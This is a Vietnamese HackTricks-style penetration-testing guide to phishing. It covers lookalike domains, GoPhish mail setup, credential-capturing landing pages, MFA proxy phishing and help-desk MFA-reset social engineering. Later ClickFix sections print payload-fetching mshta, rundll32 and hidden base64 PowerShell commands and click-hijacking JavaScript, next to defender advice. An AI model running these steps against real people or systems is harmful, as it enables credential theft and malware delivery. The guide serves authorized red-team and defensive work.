# Phương pháp Phishing

{{#include ../../banners/hacktricks-training.md}}

## Phương pháp

1. Trinh sát nạn nhân
   1. Chọn **domain của nạn nhân**.
   2. Thực hiện một số hoạt động liệt kê web cơ bản, **tìm các cổng đăng nhập** mà nạn nhân sử dụng và **quyết định** cổng nào bạn sẽ **giả mạo**.
   3. Sử dụng **OSINT** để **tìm email**.
2. Chuẩn bị môi trường
   1. **Mua domain** bạn sẽ sử dụng cho đợt đánh giá phishing
   2. **Cấu hình các bản ghi liên quan đến dịch vụ email** (SPF, DMARC, DKIM, rDNS)
   3. Cấu hình VPS với **gophish**
3. Chuẩn bị chiến dịch
   1. Chuẩn bị **mẫu email**
   2. Chuẩn bị **trang web** để đánh cắp thông tin xác thực
4. Khởi chạy chiến dịch!

## Tạo các tên domain tương tự hoặc mua domain đáng tin cậy

### Kỹ thuật biến đổi tên domain

- **Keyword**: Tên domain **chứa** một **keyword** quan trọng của domain gốc (ví dụ: zelster.com-management.com).<sup>[[1]](#references)</sup>
- **hypened subdomain**: Đổi **dấu chấm thành dấu gạch nối** trong subdomain (ví dụ: www-zelster.com).
- **New TLD**: Sử dụng cùng domain với một **TLD mới** (ví dụ: zelster.org)
- **Homoglyph**: **Thay thế** một chữ cái trong tên domain bằng **chữ cái trông tương tự** (ví dụ: zelfser.com).


{{#ref}}
homograph-attacks.md
{{#endref}}
- **Transposition:** **Đổi chỗ hai chữ cái** trong tên domain (ví dụ: zelsetr.com).
- **Singularization/Pluralization**: Thêm hoặc xóa chữ “s” ở cuối tên domain (ví dụ: zeltsers.com).
- **Omission**: **Xóa một** chữ cái khỏi tên domain (ví dụ: zelser.com).
- **Repetition:** **Lặp lại một** chữ cái trong tên domain (ví dụ: zeltsser.com).
- **Replacement**: Tương tự Homoglyph nhưng ít kín đáo hơn. Thay thế một chữ cái trong tên domain, có thể bằng một chữ cái nằm gần chữ cái gốc trên bàn phím (ví dụ: zektser.com).
- **Subdomained**: Chèn một **dấu chấm** vào bên trong tên domain (ví dụ: ze.lster.com).
- **Insertion**: **Chèn một chữ cái** vào tên domain (ví dụ: zerltser.com).
- **Missing dot**: Nối TLD vào tên domain (ví dụ: zelstercom.com)

**Công cụ tự động**

- [**dnstwist**](https://github.com/elceef/dnstwist)
- [**urlcrazy**](https://github.com/urbanadventurer/urlcrazy)

**Trang web**

- [https://dnstwist.it/](https://dnstwist.it)
- [https://dnstwister.report/](https://dnstwister.report)
- [https://www.internetmarketingninjas.com/tools/free-tools/domain-typo-generator/](https://www.internetmarketingninjas.com/tools/free-tools/domain-typo-generator/)

### Bitflipping

Có **khả năng một số bit được lưu trữ hoặc đang truyền tải tự động bị đảo trạng thái** do nhiều yếu tố như bão mặt trời, tia vũ trụ hoặc lỗi phần cứng.

Khi khái niệm này được **áp dụng vào các yêu cầu DNS**, domain mà **máy chủ DNS nhận được** có thể không giống với domain được yêu cầu ban đầu.

Ví dụ, việc sửa đổi một bit trong domain "windows.com" có thể biến nó thành "windnws.com."

Kẻ tấn công có thể **lợi dụng điều này bằng cách đăng ký nhiều domain bị ảnh hưởng bởi bit-flipping** có tên tương tự domain của nạn nhân. Mục đích của chúng là chuyển hướng người dùng hợp pháp đến hạ tầng của chúng.

Để biết thêm thông tin, hãy đọc [https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/](https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/).<sup>[[10]](#references)[[11]](#references)</sup>

### Mua domain đáng tin cậy

Bạn có thể tìm kiếm domain đã hết hạn mà mình có thể sử dụng tại [https://www.expireddomains.net/](https://www.expireddomains.net).\
Để đảm bảo domain đã hết hạn mà bạn định mua **đã có SEO tốt**, bạn có thể kiểm tra cách domain được phân loại tại:

- [http://www.fortiguard.com/webfilter](http://www.fortiguard.com/webfilter)
- [https://urlfiltering.paloaltonetworks.com/query/](https://urlfiltering.paloaltonetworks.com/query/)

## Tìm email

- [https://github.com/laramies/theHarvester](https://github.com/laramies/theHarvester) (miễn phí 100%)
- [https://phonebook.cz/](https://phonebook.cz) (miễn phí 100%)
- [https://maildb.io/](https://maildb.io)
- [https://hunter.io/](https://hunter.io)
- [https://anymailfinder.com/](https://anymailfinder.com)

Để **tìm thêm** địa chỉ email hợp lệ hoặc **xác minh những địa chỉ** bạn đã tìm thấy, bạn có thể kiểm tra xem mình có thể brute-force máy chủ SMTP của nạn nhân hay không. [Tìm hiểu cách xác minh/tìm địa chỉ email tại đây](../../network-services-pentesting/pentesting-smtp/index.html#username-bruteforce-enumeration).\
Ngoài ra, đừng quên rằng nếu người dùng sử dụng **bất kỳ cổng web nào để truy cập email**, bạn có thể kiểm tra xem cổng đó có dễ bị **brute-force username** hay không và khai thác lỗ hổng nếu có thể.

## Cấu hình GoPhish

### Cài đặt

Bạn có thể tải xuống từ [https://github.com/gophish/gophish/releases/tag/v0.11.0](https://github.com/gophish/gophish/releases/tag/v0.11.0)

Tải xuống và giải nén vào `/opt/gophish`, sau đó chạy `/opt/gophish/gophish`\
Mật khẩu cho người dùng admin ở cổng 3333 sẽ được hiển thị trong đầu ra. Vì vậy, hãy truy cập cổng đó và dùng thông tin xác thực này để đổi mật khẩu admin. Bạn có thể cần tunnel cổng đó về máy cục bộ:

```bash
ssh -L 3333:127.0.0.1:3333 <user>@<ip>
```

### Cấu hình

**Cấu hình chứng chỉ TLS**

Trước bước này, bạn cần **mua domain** định sử dụng và domain đó phải **trỏ** đến **IP của VPS** nơi bạn đang cấu hình **gophish**.

```bash
DOMAIN="<domain>"
wget https://dl.eff.org/certbot-auto
chmod +x certbot-auto
sudo apt install snapd
sudo snap install core
sudo snap refresh core
sudo apt-get remove certbot
sudo snap install --classic certbot
sudo ln -s /snap/bin/certbot /usr/bin/certbot
certbot certonly --standalone -d "$DOMAIN"
mkdir /opt/gophish/ssl_keys
cp "/etc/letsencrypt/live/$DOMAIN/privkey.pem" /opt/gophish/ssl_keys/key.pem
cp "/etc/letsencrypt/live/$DOMAIN/fullchain.pem" /opt/gophish/ssl_keys/key.crt​
```

**Cấu hình Mail**

Bắt đầu cài đặt: `apt-get install postfix`

Sau đó thêm domain vào các file sau:

- **/etc/postfix/virtual_domains**
- **/etc/postfix/transport**
- **/etc/postfix/virtual_regexp**

**Đồng thời thay đổi giá trị của các biến sau trong /etc/postfix/main.cf**

`myhostname = <domain>`\
`mydestination = $myhostname, <domain>, localhost.com, localhost`

Cuối cùng, sửa các file **`/etc/hostname`** và **`/etc/mailname`** thành tên domain của bạn rồi **khởi động lại VPS.**

Bây giờ, tạo một **DNS A record** cho `mail.<domain>` trỏ đến **địa chỉ IP** của VPS và một **DNS MX record** trỏ đến `mail.<domain>`

Bây giờ hãy thử gửi email:

```bash
apt install mailutils
echo "This is the body of the email" | mail -s "This is the subject line" test@email.com
```

**Cấu hình Gophish**

Dừng gophish và hãy cấu hình nó.\
Sửa `/opt/gophish/config.json` thành như sau (lưu ý sử dụng https):

```bash
{
        "admin_server": {
                "listen_url": "127.0.0.1:3333",
                "use_tls": true,
                "cert_path": "gophish_admin.crt",
                "key_path": "gophish_admin.key"
        },
        "phish_server": {
                "listen_url": "0.0.0.0:443",
                "use_tls": true,
                "cert_path": "/opt/gophish/ssl_keys/key.crt",
                "key_path": "/opt/gophish/ssl_keys/key.pem"
        },
        "db_name": "sqlite3",
        "db_path": "gophish.db",
        "migrations_prefix": "db/db_",
        "contact_address": "",
        "logging": {
                "filename": "",
                "level": ""
        }
}
```

**Cấu hình dịch vụ gophish**

Để tạo dịch vụ gophish có thể tự động khởi động và được quản lý như một dịch vụ, bạn có thể tạo tệp `/etc/init.d/gophish` với nội dung sau:

```bash
#!/bin/bash
# /etc/init.d/gophish
# initialization file for stop/start of gophish application server
#
# chkconfig: - 64 36
# description: stops/starts gophish application server
# processname:gophish
# config:/opt/gophish/config.json
# From https://github.com/gophish/gophish/issues/586

# define script variables

processName=Gophish
process=gophish
appDirectory=/opt/gophish
logfile=/var/log/gophish/gophish.log
errfile=/var/log/gophish/gophish.error

start() {
    echo 'Starting '${processName}'...'
    cd ${appDirectory}
    nohup ./$process >>$logfile 2>>$errfile &
    sleep 1
}

stop() {
    echo 'Stopping '${processName}'...'
    pid=$(/bin/pidof ${process})
    kill ${pid}
    sleep 1
}

status() {
    pid=$(/bin/pidof ${process})
    if [["$pid" != ""| "$pid" != "" ]]; then
        echo ${processName}' is running...'
    else
        echo ${processName}' is not running...'
    fi
}

case $1 in
    start|stop|status) "$1" ;;
esac
```

Hoàn tất cấu hình dịch vụ và kiểm tra dịch vụ bằng cách:

```bash
mkdir /var/log/gophish
chmod +x /etc/init.d/gophish
update-rc.d gophish defaults
#Check the service
service gophish start
service gophish status
ss -l | grep "3333\|443"
service gophish stop
```

## Cấu hình mail server và domain

### Chờ đợi & tạo uy tín

Domain càng lâu đời thì càng ít có khả năng bị đánh dấu là spam. Vì vậy, bạn nên chờ lâu nhất có thể (ít nhất 1 tuần) trước khi thực hiện đánh giá phishing. Ngoài ra, nếu bạn đăng một trang về lĩnh vực có uy tín thì domain sẽ có được uy tín tốt hơn.

Lưu ý rằng dù phải chờ một tuần, bạn vẫn có thể hoàn tất cấu hình mọi thứ ngay bây giờ.

### Cấu hình bản ghi Reverse DNS (rDNS)

Thiết lập bản ghi rDNS (PTR) để phân giải địa chỉ IP của VPS thành tên domain.

### Bản ghi Sender Policy Framework (SPF)

Bạn phải **cấu hình bản ghi SPF cho domain mới**. Nếu bạn chưa biết bản ghi SPF là gì, hãy [**đọc trang này**](../../network-services-pentesting/pentesting-smtp/index.html#spf).

Bạn có thể dùng [https://www.spfwizard.net/](https://www.spfwizard.net) để tạo chính sách SPF (dùng IP của máy VPS).

![Biểu mẫu SPF Wizard để tạo bản ghi SPF cho domain phishing](<../../images/image (1037).png>)

Đây là nội dung cần được thiết lập trong bản ghi TXT của domain:

```bash
v=spf1 mx a ip4:ip.ip.ip.ip ?all
```

### Bản ghi Domain-based Message Authentication, Reporting & Conformance (DMARC)

Bạn phải **cấu hình bản ghi DMARC cho domain mới**. Nếu bạn chưa biết bản ghi DMARC là gì, hãy [**đọc trang này**](../../network-services-pentesting/pentesting-smtp/index.html#dmarc).

Bạn cần tạo một bản ghi DNS TXT mới, trỏ hostname `_dmarc.<domain>` đến nội dung sau:

```bash
v=DMARC1; p=none
```

### DomainKeys Identified Mail (DKIM)

Bạn phải **cấu hình DKIM cho domain mới**. Nếu bạn chưa biết bản ghi DKIM là gì, [**hãy đọc trang này**](../../network-services-pentesting/pentesting-smtp/index.html#dkim).

Hướng dẫn này dựa trên: [https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy](https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy).<sup>[[5]](#references)</sup>

> [!TIP]
> Bạn cần nối cả hai giá trị B64 mà khóa DKIM tạo ra:
>
> ```
> v=DKIM1; h=sha256; k=rsa; p=MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA0wPibdqPtzYk81njjQCrChIcHzxOp8a1wjbsoNtka2X9QXCZs+iXkvw++QsWDtdYu3q0Ofnr0Yd/TmG/Y2bBGoEgeE+YTUG2aEgw8Xx42NLJq2D1pB2lRQPW4IxefROnXu5HfKSm7dyzML1gZ1U0pR5X4IZCH0wOPhIq326QjxJZm79E1nTh3xj" "Y9N/Dt3+fVnIbMupzXE216TdFuifKM6Tl6O/axNsbswMS1TH812euno8xRpsdXJzFlB9q3VbMkVWig4P538mHolGzudEBg563vv66U8D7uuzGYxYT4WS8NVm3QBMg0QKPWZaKp+bADLkOSB9J2nUpk4Aj9KB5swIDAQAB
> ```

### Kiểm tra điểm cấu hình email của bạn

Bạn có thể làm điều đó bằng cách dùng [https://www.mail-tester.com/](https://www.mail-tester.com)\
Chỉ cần truy cập trang và gửi email đến địa chỉ họ cung cấp:

```bash
echo "This is the body of the email" | mail -s "This is the subject line" test-iimosa79z@srv1.mail-tester.com
```

Bạn cũng có thể **kiểm tra cấu hình email** bằng cách gửi email đến `check-auth@verifier.port25.com` và **đọc phản hồi** (để làm việc này, bạn cần **mở** port **25** và xem phản hồi trong file _/var/mail/root_ nếu gửi email với tư cách root).\
Đảm bảo bạn vượt qua tất cả các bài kiểm tra:

```bash
==========================================================
Summary of Results
==========================================================
SPF check:          pass
DomainKeys check:   neutral
DKIM check:         pass
Sender-ID check:    pass
SpamAssassin check: ham
```

Bạn cũng có thể gửi **tin nhắn đến một tài khoản Gmail do bạn kiểm soát**, rồi kiểm tra **headers của email** trong hộp thư đến Gmail của bạn; `dkim=pass` phải xuất hiện trong trường header `Authentication-Results`.

```
Authentication-Results: mx.google.com;
       spf=pass (google.com: domain of contact@example.com designates --- as permitted sender) smtp.mail=contact@example.com;
       dkim=pass header.i=@example.com;
```

### ​Gỡ khỏi danh sách đen Spamhouse

Trang [www.mail-tester.com](https://www.mail-tester.com) có thể cho bạn biết liệu domain của bạn có bị spamhouse chặn hay không. Bạn có thể yêu cầu gỡ domain/IP tại: ​[https://www.spamhaus.org/lookup/](https://www.spamhaus.org/lookup/)

### Gỡ khỏi danh sách đen Microsoft

​​Bạn có thể yêu cầu gỡ domain/IP tại [https://sender.office.com/](https://sender.office.com).

## Tạo và khởi chạy chiến dịch GoPhish

### Hồ sơ gửi

- Đặt một **tên để nhận diện** hồ sơ gửi
- Quyết định tài khoản nào sẽ được dùng để gửi email phishing. Gợi ý: _noreply, support, servicedesk, salesforce..._
- Bạn có thể để trống username và password, nhưng nhớ chọn Ignore Certificate Errors

![Tạo và khởi chạy chiến dịch GoPhish - Hồ sơ gửi: Bạn có thể để trống username và password, nhưng nhớ chọn Ignore Certificate Errors](<../../images/image (253) (1) (2) (1) (1) (2) (2) (3) (3) (5) (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (10) (15) (2).png>)

> [!TIP]
> Bạn nên dùng chức năng "**Send Test Email**" để kiểm tra xem mọi thứ có hoạt động hay không.\
> Tôi khuyên bạn nên **gửi email thử nghiệm đến các địa chỉ email 10min** để tránh bị đưa vào danh sách đen khi thử nghiệm.

### Mẫu email

- Đặt một **tên để nhận diện** mẫu
- Sau đó viết **tiêu đề** (đừng viết gì quá lạ, chỉ cần nội dung mà bạn có thể thấy trong một email thông thường)
- Nhớ chọn "**Add Tracking Image**"
- Viết **mẫu email** (bạn có thể dùng các biến như trong ví dụ sau):

```html
<html>
<head>
    <title></title>
</head>
<body>
<p class="MsoNormal"><span style="font-size:10.0pt;font-family:&quot;Verdana&quot;,sans-serif;color:black">Dear {{.FirstName}} {{.LastName}},</span></p>
<br />
Note: We require all user to login an a very suspicios page before the end of the week, thanks!<br />
<br />
Regards,</span></p>

WRITE HERE SOME SIGNATURE OF SOMEONE FROM THE COMPANY

<p>{{.Tracker}}</p>
</body>
</html>
```

Lưu ý rằng **để tăng độ tin cậy của email**, bạn nên sử dụng chữ ký trong một email của khách hàng. Gợi ý:

- Gửi email đến một **địa chỉ không tồn tại** và kiểm tra xem phản hồi có chữ ký hay không.
- Tìm các **email công khai** như info@ex.com, press@ex.com hoặc public@ex.com, gửi email đến đó rồi chờ phản hồi.
- Thử liên hệ với một email **hợp lệ đã tìm được** rồi chờ phản hồi.

![Hồ sơ gửi - Mẫu email: Thử liên hệ với một email hợp lệ đã tìm được rồi chờ phản hồi](<../../images/image (80).png>)

> [!TIP]
> Mẫu email cũng cho phép **đính kèm tệp để gửi**. Nếu bạn cũng muốn đánh cắp NTLM challenge bằng một số tệp/tài liệu được tạo đặc biệt, [hãy đọc trang này](../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md).

### Trang đích

- Điền **tên**
- **Viết mã HTML** cho trang web. Lưu ý rằng bạn có thể **nhập** trang web.
- Đánh dấu **Capture Submitted Data** và **Capture Passwords**
- Thiết lập **chuyển hướng**

![Mẫu email - Trang đích: Đánh dấu Capture Submitted Data và Capture Passwords](<../../images/image (826).png>)

> [!TIP]
> Thông thường, bạn sẽ cần chỉnh sửa mã HTML của trang và thử nghiệm cục bộ (có thể dùng một máy chủ Apache) **cho đến khi hài lòng với kết quả.** Sau đó, viết mã HTML đó vào ô.\
> Lưu ý rằng nếu cần **dùng tài nguyên tĩnh** cho HTML (có thể là một số trang CSS và JS), bạn có thể lưu chúng trong _**/opt/gophish/static/endpoint**_ rồi truy cập từ _**/static/\<filename>**_

> [!TIP]
> Để chuyển hướng, bạn có thể **chuyển người dùng đến trang web chính thức của nạn nhân**, hoặc chuyển họ đến _/static/migration.html_ chẳng hạn, hiển thị một **vòng xoay tải (**[**https://loading.io/**](https://loading.io)**) trong 5 giây rồi thông báo rằng quá trình đã thành công**.

### Người dùng & Nhóm

- Đặt tên
- **Nhập dữ liệu** (lưu ý rằng để dùng mẫu trong ví dụ, bạn cần họ, tên và địa chỉ email của từng người dùng)

![Trang đích - Người dùng & Nhóm: Nhập dữ liệu (lưu ý rằng để dùng mẫu trong ví dụ, bạn cần họ, tên và địa chỉ email của từng người dùng)](<../../images/image (163).png>)

### Chiến dịch

Cuối cùng, tạo một chiến dịch bằng cách chọn tên, mẫu email, trang đích, URL, hồ sơ gửi và nhóm. Lưu ý rằng URL sẽ là liên kết được gửi cho nạn nhân.

Lưu ý rằng **Hồ sơ gửi cho phép gửi email thử nghiệm để xem email Phishing cuối cùng sẽ trông như thế nào**:

![Người dùng & Nhóm - Chiến dịch: Lưu ý rằng Hồ sơ gửi cho phép gửi email thử nghiệm để xem email Phishing cuối cùng sẽ trông như thế nào](<../../images/image (192).png>)

Khi mọi thứ đã sẵn sàng, hãy khởi chạy chiến dịch!

## Sao chép trang web

Nếu vì lý do nào đó bạn muốn sao chép trang web, hãy xem trang sau:


{{#ref}}
clone-a-website.md
{{#endref}}

## Tài liệu & Tệp cài backdoor

Trong một số đợt đánh giá Phishing (chủ yếu là với Red Team), bạn cũng sẽ muốn **gửi các tệp có chứa một dạng backdoor nào đó** (có thể là C2 hoặc chỉ là thứ gì đó kích hoạt xác thực).\
Xem trang sau để biết một số ví dụ:


{{#ref}}
phishing-documents.md
{{#endref}}

## Phishing MFA

### Qua Proxy MitM

Cuộc tấn công trước khá tinh vi vì bạn giả mạo một trang web thật và thu thập thông tin người dùng nhập vào. Đáng tiếc, nếu người dùng nhập sai mật khẩu hoặc ứng dụng bạn giả mạo được cấu hình với 2FA, **thông tin này sẽ không giúp bạn mạo danh người dùng bị lừa**.

Đây là lúc các công cụ như [**evilginx2**](https://github.com/kgretzky/evilginx2)**,** [**CredSniper**](https://github.com/ustayready/CredSniper) và [**muraena**](https://github.com/muraenateam/muraena) phát huy tác dụng. Công cụ này cho phép bạn thực hiện một cuộc tấn công kiểu MitM. Về cơ bản, cuộc tấn công diễn ra như sau:

1. Bạn **giả mạo biểu mẫu đăng nhập** của trang web thật.
2. Người dùng **gửi** **thông tin đăng nhập** đến trang giả mạo của bạn, rồi công cụ gửi chúng đến trang web thật, **kiểm tra xem thông tin đăng nhập có hợp lệ không**.
3. Nếu tài khoản được cấu hình với **2FA**, trang MitM sẽ yêu cầu mã này và khi **người dùng nhập** mã, công cụ sẽ gửi mã đến trang web thật.
4. Khi người dùng đã xác thực, bạn (với tư cách kẻ tấn công) sẽ **thu thập được thông tin đăng nhập, 2FA, cookie và mọi thông tin** từ các tương tác của người dùng trong lúc công cụ đang thực hiện MitM.

### Qua VNC

Nếu thay vì **đưa nạn nhân đến một trang độc hại** có giao diện giống trang gốc, bạn đưa họ đến một **phiên VNC có trình duyệt kết nối với trang web thật** thì sao? Bạn sẽ có thể xem họ làm gì, đánh cắp mật khẩu, MFA được sử dụng, cookie...\
Bạn có thể làm việc này bằng [**EvilnVNC**](https://github.com/JoelGMSec/EvilnoVNC).<sup>[[3]](#references)[[4]](#references)</sup>

## Phát hiện việc bị phát hiện

Rõ ràng, một trong những cách tốt nhất để biết bạn đã bị phát hiện hay chưa là **tìm tên miền của bạn trong các blacklist**. Nếu tên miền xuất hiện trong danh sách, có nghĩa là nó đã bị phát hiện là đáng ngờ theo cách nào đó.\
Một cách đơn giản để kiểm tra xem tên miền của bạn có xuất hiện trong blacklist nào không là dùng [https://malwareworld.com/](https://malwareworld.com)

Tuy nhiên, còn có những cách khác để biết nạn nhân có **chủ động tìm kiếm hoạt động Phishing đáng ngờ ngoài thực tế hay không**, như được giải thích tại:


{{#ref}}
detecting-phising.md
{{#endref}}

Bạn có thể **mua một tên miền có tên rất giống với tên miền của nạn nhân** và/hoặc **tạo chứng chỉ** cho một **tên miền phụ** thuộc tên miền do bạn kiểm soát, **có chứa** **từ khóa** trong tên miền của nạn nhân. Nếu **nạn nhân** thực hiện bất kỳ **tương tác DNS hoặc HTTP** nào với chúng, bạn sẽ biết rằng họ **đang chủ động tìm kiếm** các tên miền đáng ngờ và bạn cần hoạt động thật kín đáo.<sup>[[2]](#references)</sup>

### Đánh giá email Phishing

Dùng [**Phishious** ](https://github.com/Rices/Phishious)để đánh giá xem email của bạn sẽ vào thư mục spam, bị chặn hay gửi thành công.

## Chiếm đoạt danh tính bằng tương tác trực tiếp (Đặt lại MFA qua bộ phận hỗ trợ)

Các nhóm xâm nhập hiện đại ngày càng bỏ qua hoàn toàn các mồi nhử qua email và **nhắm trực tiếp vào quy trình hỗ trợ dịch vụ/khôi phục danh tính** để vượt qua MFA. Cuộc tấn công hoàn toàn theo kiểu "living-off-the-land": khi đã có thông tin đăng nhập hợp lệ, kẻ điều hành sẽ di chuyển ngang bằng các công cụ quản trị tích hợp sẵn – không cần malware.<sup>[[6]](#references)</sup>

### Quy trình tấn công
1. Thu thập thông tin về nạn nhân
   * Thu thập thông tin cá nhân và công việc từ LinkedIn, các vụ rò rỉ dữ liệu, GitHub công khai, v.v.
   * Xác định các danh tính có giá trị cao (lãnh đạo, IT, tài chính) và tìm hiểu **chính xác quy trình hỗ trợ** để đặt lại mật khẩu/MFA.
2. Social engineering theo thời gian thực
   * Gọi điện, liên hệ qua Teams hoặc chat với bộ phận hỗ trợ, giả mạo mục tiêu (thường dùng **caller-ID giả mạo** hoặc **giọng nói nhân bản**).
   * Cung cấp PII đã thu thập trước đó để vượt qua bước xác minh dựa trên kiến thức.
   * Thuyết phục nhân viên **đặt lại secret MFA** hoặc thực hiện **SIM-swap** cho số điện thoại đã đăng ký.
3. Các hành động ngay sau khi có quyền truy cập (≤60 phút trong các trường hợp thực tế)
   * Thiết lập chỗ đứng thông qua bất kỳ cổng web SSO nào.
   * Liệt kê AD / AzureAD bằng các công cụ có sẵn (không thả binary):
     ```powershell
     # list directory groups & privileged roles
     Get-ADGroup -Filter * -Properties Members | ?{$_.Members -match $env:USERNAME}

     # AzureAD / Graph – list directory roles
     Get-MgDirectoryRole | ft DisplayName,Id

     # Enumerate devices the account can login to
     Get-MgUserRegisteredDevice -UserId <user@corp.local>
     ```
   * Di chuyển ngang bằng **WMI**, **PsExec** hoặc các agent **RMM** hợp pháp đã được đưa vào danh sách cho phép trong môi trường.

### Phát hiện & Giảm thiểu
* Xem việc khôi phục danh tính qua bộ phận hỗ trợ là **thao tác đặc quyền** – yêu cầu xác thực tăng cường và phê duyệt của quản lý.
* Triển khai các quy tắc **Identity Threat Detection & Response (ITDR)** / **UEBA** để cảnh báo khi:  
  * Phương thức MFA bị thay đổi + xác thực từ thiết bị / vị trí địa lý mới.  
  * Cùng một principal được nâng quyền ngay lập tức (user-→-admin).  
* Ghi âm các cuộc gọi tới bộ phận hỗ trợ và yêu cầu **gọi lại số điện thoại đã đăng ký trước đó** trước khi đặt lại.
* Triển khai **Just-In-Time (JIT) / Privileged Access** để các tài khoản vừa được đặt lại **không tự động thừa hưởng token có đặc quyền cao**.

---

## Đánh lạc hướng quy mô lớn – SEO Poisoning & chiến dịch “ClickFix”
Các nhóm tội phạm phổ thông bù đắp chi phí cho các chiến dịch nhắm mục tiêu kỹ lưỡng bằng các cuộc tấn công đại trà, biến **công cụ tìm kiếm và mạng quảng cáo thành kênh phát tán**.<sup>[[6]](#references)</sup>

1. **SEO poisoning / malvertising** đẩy một kết quả giả mạo như `chromium-update[.]site` lên đầu quảng cáo tìm kiếm.
2. Nạn nhân tải xuống một **first-stage loader** nhỏ (thường là JS/HTA/ISO). Ví dụ được Unit 42 ghi nhận:
   * `RedLine stealer`
   * `Lumma stealer`
   * `Lampion Trojan`
3. Loader đánh cắp cookie trình duyệt + cơ sở dữ liệu thông tin xác thực, sau đó tải xuống một **loader chạy ngầm**, quyết định – *theo thời gian thực* – có triển khai:
   * RAT (ví dụ: AsyncRAT, RustDesk)
   * ransomware / wiper
   * thành phần duy trì hiện diện (khóa Run trong registry + scheduled task)

### Mẹo tăng cường bảo mật
* Chặn các domain mới đăng ký và áp dụng **Advanced DNS / URL Filtering** cho cả *quảng cáo tìm kiếm* lẫn email.
* Chỉ cho phép cài đặt phần mềm từ các gói MSI đã ký / Store, dùng chính sách để chặn thực thi `HTA`, `ISO`, `VBS`.
* Giám sát các tiến trình con của trình duyệt khi mở trình cài đặt:
  ```yaml
  - parent_image: /Program Files/Google/Chrome/*
    and child_image: *\\*.exe
  ```
* Tìm các LOLBins thường bị first-stage loader lạm dụng (ví dụ: `regsvr32`, `curl`, `mshta`).

### Chiếm quyền click nút tải xuống bằng cách chuyển hướng qua TDS
Một số cổng phần mềm giả mạo vẫn để `href` tải xuống hiển thị trỏ đến URL GitHub/release **thật**, nhưng chiếm quyền tương tác đầu tiên của người dùng bằng JavaScript và đưa nạn nhân vào chuỗi **Traffic Distribution System (TDS)**.<sup>[[9]](#references)</sup>

```javascript
const cachedOpen = window.open;
document.addEventListener(isChromeDesktop() ? "mousedown" : "click", (e) => {
  if (!isEligibleClick(e.target)) return;
  cachedOpen(generateRuntimeURL({referrer: location.href, userDestination: extractClickedLink(e.target)}));
  e.stopImmediatePropagation();
  e.preventDefault();
}, true);
```

Các đặc điểm chính:
- Hook thường chạy ở **capture phase** (`true`) trên `document`, nên được kích hoạt trước các handler của trang web.
- Chrome thường dùng `mousedown` thay vì `click` để giữ redirect gắn với một **user gesture** hợp lệ và tăng khả năng bypass popup-blocker.
- Một số biến thể mở sẵn `about:blank` hoặc kích hoạt click trên `<a target="_blank">` được tạo tự động, rồi chỉ sau đó mới gán URL TDS.
- Giới hạn ở phía trình duyệt thường được lưu trong `localStorage`, nên **lần click đầu tiên** có thể dẫn đến malware, trong khi các lần refresh/thử lại sẽ chuyển về link hiển thị trông có vẻ vô hại.
- TDS có thể lọc theo referrer, domain truy cập, GEO, fingerprint trình duyệt/thiết bị, kiểm tra VPN/datacenter, ngữ cảnh click và bộ đếm theo phiên, khiến việc analyst phát lại không cho kết quả nhất quán.

Ý tưởng cho defender:
- So sánh `href` **được hiển thị** với đích điều hướng **thực tế** được tạo ra khi click.
- Tìm các handler `document.addEventListener(..., true)` gọi cả `preventDefault()` và `stopImmediatePropagation()` cùng với `window.open`, `about:blank` hoặc click anchor được tạo tự động.
- Xem các cụm domain tải phần mềm mới đăng ký cùng tải một stage CloudFront/JS là dấu hiệu có giá trị cao của mô hình SEO-poisoning/TDS.

### ClickFix từ các trang xác minh giả mạo + các lượt tải LOLBAS trông như tải archive
Một số nhánh TDS dẫn đến trang xác minh giả mạo (kiểu Cloudflare/IUAM), hướng dẫn nạn nhân chạy một Windows binary đáng tin cậy như sau:<sup>[[9]](#references)</sup>

```cmd
C:\Windows\SysWOW64\mshta.exe https://example[.]com/navy.7z
```

Ghi chú:
- `mshta.exe` thực thi **HTA/VBScript ở đầu phản hồi**, ngay cả khi URL giả dạng một archive `.7z`; dữ liệu archive được nối thêm có thể chỉ là mồi nhử.
- Các stage tiếp theo thường tiếp tục giả dạng loại file (`.rtf` cho PowerShell, `.asar` cho Python, ZIP chứa binary được đệm thêm dữ liệu), rồi chuyển sang **manual PE mapping / in-memory execution**.
- Nếu bạn đang ứng phó với một chuỗi tấn công như vậy, hãy lưu lại **network + memory từ lần chạy thành công đầu tiên**: những lần phát lại sau có thể chỉ cho thấy một đường dẫn installer/SFX lành tính hoặc thất bại vì payload/key release được ràng buộc với TDS session ban đầu.

### Thủ pháp phát tán DLL kiểu ClickFix (giả mạo bản cập nhật CERT)
* Mồi nhử: trang tư vấn CERT quốc gia được sao chép, có nút **Update** hiển thị hướng dẫn “khắc phục” từng bước. Nạn nhân được hướng dẫn chạy một batch để tải DLL xuống rồi thực thi bằng `rundll32`.<sup>[[12]](#references)</sup>
* Chuỗi batch thường gặp:
  ```cmd
  echo powershell -Command "Invoke-WebRequest -Uri 'https://example[.]org/notepad2.dll' -OutFile '%TEMP%\notepad2.dll'"
  echo timeout /t 10
  echo rundll32.exe "%TEMP%\notepad2.dll",notepad
  ```
  * `Invoke-WebRequest` ghi payload vào `%TEMP%`, một khoảng chờ ngắn giúp che giấu độ trễ mạng, sau đó `rundll32` gọi entrypoint được export (`notepad`).
* DLL beacon thông tin nhận dạng host và thăm dò C2 vài phút một lần. Các lệnh từ xa được gửi dưới dạng **PowerShell mã hóa base64**, thực thi ẩn và bypass policy:
  ```powershell
  powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('<b64_task>')) | Invoke-Expression"
  ```
  * Điều này duy trì tính linh hoạt của C2 (server có thể thay đổi task mà không cần cập nhật DLL) và ẩn cửa sổ console. Tìm các tiến trình PowerShell con của `rundll32.exe` có cả `-WindowStyle Hidden` + `FromBase64String` + `Invoke-Expression`.
